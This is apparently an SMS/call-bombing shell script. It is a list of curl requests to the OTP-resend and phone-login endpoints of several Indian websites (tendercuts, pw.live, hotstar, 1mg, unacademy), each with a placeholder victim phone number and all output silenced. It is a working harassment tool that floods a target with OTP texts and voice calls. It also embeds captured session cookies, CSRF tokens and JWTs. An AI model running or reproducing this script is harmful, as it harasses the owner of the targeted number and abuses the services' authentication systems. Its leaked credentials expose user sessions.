curl 'https://api.tendercuts.in/otp/retry/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
  --compressed > /dev/null 2>&1
curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=2' \
  -H 'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'client-version: 1114' \
  -H 'Authorization: Bearer' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer: https://www.pw.live/' \
  -H 'randomId: 9242fe67-d24e-4fb1-8859-3d726e2471e3' \
  -H 'client-id: 5eb393ee95fab7468a79d189' \
  -H 'Client-Type: WEB' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
  --compressed > /dev/null 2>&1
  
  
  curl 'https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp' \
  -H 'authority: www.hotstar.com' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: eng' \
  -H 'content-type: application/json' \
  -H 'cookie: geo=IN,DL,NEWDELHI,28.60,77.20,135714; geo=IN,DL,NEWDELHI,28.60,77.20,135714; device_id=4e5485f2-c190-48cf-8c98-883a4c400278; hs_uid=4e5485f2-c190-48cf-8c98-883a4c400278; userLocale=eng; x_migration_exp=true; SELECTED__LANGUAGE=eng; deviceId=4e5485f2-c190-48cf-8c98-883a4c400278; appLaunchCounter=1; userPID=1827e469ba084ff1b8491bba21241d21; userHID=893e0038eea44d16bfb465bd292019c3; userCountryCode=in; userUP=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2ODUyODQwNjIsImlhdCI6MTY4NDY3OTI2MiwiaXNzIjoiVFMiLCJqdGkiOiI2MTZiNGRlMzA4ODY0MjY1OTJhMDVhMDU4ZGJhYWU2ZSIsInN1YiI6IntcImhJZFwiOlwiODkzZTAwMzhlZWE0NGQxNmJmYjQ2NWJkMjkyMDE5YzNcIixcInBJZFwiOlwiMTgyN2U0NjliYTA4NGZmMWI4NDkxYmJhMjEyNDFkMjFcIixcIm5hbWVcIjpcIllvdVwiLFwiaXBcIjpcIjEwMy4xODAuOTQuMTI4XCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2ODQ2NzkyNjI1MzYsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFEb0FDZ1FJQUNJQUNnUUlBQklBQ2dRSUFESUFDZ1FJQUVJQUNvWUJDQUFxZ1FFS0Fnb0FDZ29LQWdnQ0dLS2Y2NThHQ204S0J3Z0JGUUFBQUVBU0Nnb0RhMkZ1SllpaTNqc1NDZ29EYldGc0pTUjhNRDBTQ2dvRGFHbHVKYmt6Q3o4U0Nnb0RaVzVuSmZRNFZ6MFNDZ29EWW1WdUpXYjRqajBTQ2dvRGRHRnRKWWN6Qno0U0Nnb0RkR1ZzSmJYKzNqMFNDZ29EYldGeUpiTitNRDBZb3Avcm53WT1cIn0iLCJ2ZXJzaW9uIjoiMV8wIn0.yIwtonJnbHXyn7adc_4s4g78j1-XifeZFBISw94AlpM; _gcl_au=1.1.804006120.1684679079; _gid=GA1.2.489298503.1684679080; _ga=GA1.1.154498349.1684679080; _uetsid=38a30f90f7e311eda6173f3cef886211; _uetvid=e98f1c60afd111ed840a9fe0588374ac; _fbp=fb.1.1684679079860.1185201776; AK_SERVER_TIME=1684679289; _ga_QV5FD29XJC=GS1.1.1684679079.1.1.1684679136.3.0.0' \
  -H 'origin: https://www.hotstar.com' \
  -H 'referer: https://www.hotstar.com/in/paywall' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  -H 'x-country-code: in' \
  -H 'x-hs-accept-language: eng' \
  -H 'x-hs-client: platform:web;app_version:23.05.08.0;browser:Chrome;schema_version:0.0.842' \
  -H 'x-hs-client-targeting: ad_id:4e5485f2-c190-48cf-8c98-883a4c400278;user_lat:false' \
  -H 'x-hs-device-id: 4e5485f2-c190-48cf-8c98-883a4c400278' \
  -H 'x-hs-platform: web' \
  -H 'x-hs-request-id: 2ecfe6-3d2059-587d9b-2e7e7f' \
  -H 'x-hs-usertoken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2ODUyODQwNjIsImlhdCI6MTY4NDY3OTI2MiwiaXNzIjoiVFMiLCJqdGkiOiI2MTZiNGRlMzA4ODY0MjY1OTJhMDVhMDU4ZGJhYWU2ZSIsInN1YiI6IntcImhJZFwiOlwiODkzZTAwMzhlZWE0NGQxNmJmYjQ2NWJkMjkyMDE5YzNcIixcInBJZFwiOlwiMTgyN2U0NjliYTA4NGZmMWI4NDkxYmJhMjEyNDFkMjFcIixcIm5hbWVcIjpcIllvdVwiLFwiaXBcIjpcIjEwMy4xODAuOTQuMTI4XCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2ODQ2NzkyNjI1MzYsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFEb0FDZ1FJQUNJQUNnUUlBQklBQ2dRSUFESUFDZ1FJQUVJQUNvWUJDQUFxZ1FFS0Fnb0FDZ29LQWdnQ0dLS2Y2NThHQ204S0J3Z0JGUUFBQUVBU0Nnb0RhMkZ1SllpaTNqc1NDZ29EYldGc0pTUjhNRDBTQ2dvRGFHbHVKYmt6Q3o4U0Nnb0RaVzVuSmZRNFZ6MFNDZ29EWW1WdUpXYjRqajBTQ2dvRGRHRnRKWWN6Qno0U0Nnb0RkR1ZzSmJYKzNqMFNDZ29EYldGeUpiTitNRDBZb3Avcm53WT1cIn0iLCJ2ZXJzaW9uIjoiMV8wIn0.yIwtonJnbHXyn7adc_4s4g78j1-XifeZFBISw94AlpM' \
  -H 'x-request-id: 2ecfe6-3d2059-587d9b-2e7e7f' \
  --data-raw '{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","phone_number":"€tor","initiate_by":1,"recaptcha_token":"","source":0}}' \
  --compressed > /dev/null 2>&1
  
  
    curl 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; AWSALBTG=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; AWSALBTGCORS=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; rl_session=RudderEncrypt%3AU2FsdGVkX19k1sKjNkmJ0%2BE2UJNIxhxyg8AG53dzSaIKZi0oI2Gl6DNxg66M5CAzF6LA1o3FmnDKyNgn5AwoTJVjE%2FTWnmtLhtj0Ysr2z%2B%2Bsf%2FSbHvSYHd3VJevNHij9AuM4Slxl388yg2%2BHHb82VA%3D%3D' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
  --compressed > /dev/null 2>&1
  
    curl 'https://api.tendercuts.in/otp/retry/' \
  -H 'authority: api.tendercuts.in' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'origin: https://www.tendercuts.in' \
  -H 'referer: https://www.tendercuts.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
  --compressed > /dev/null 2>&1
  
    curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _ga_6JX23YC5TQ=GS1.1.1676749491.1.1.1676749507.0.0.0; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed > /dev/null 2>&1
  
